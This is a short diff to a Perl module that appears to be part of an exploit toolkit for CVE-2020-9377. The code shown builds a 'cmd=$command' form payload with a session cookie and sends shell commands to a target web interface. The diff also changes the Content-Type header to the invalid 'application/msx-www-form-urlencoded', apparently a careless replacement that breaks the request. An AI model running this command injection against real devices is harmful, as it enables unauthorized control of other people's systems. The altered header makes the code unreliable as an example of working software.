@@ -18,7 +18,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
         );
 
         if ($target) {
-            if ($target !~ /^http(s)?:\/\//x) {
+            if ($target !~ /^http(s)?:\/\//msx) {
                 $target = "http://$target";
             }
 
@@ -26,7 +26,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
             my $payload   = "cmd=$command";
             
             my $headers   = HTTP::Headers -> new (
-                'Content-Type' => "application/x-www-form-urlencoded",
+                'Content-Type' => "application/msx-www-form-urlencoded",
                 'Cookie' => "uid=$cookie"
             );
 
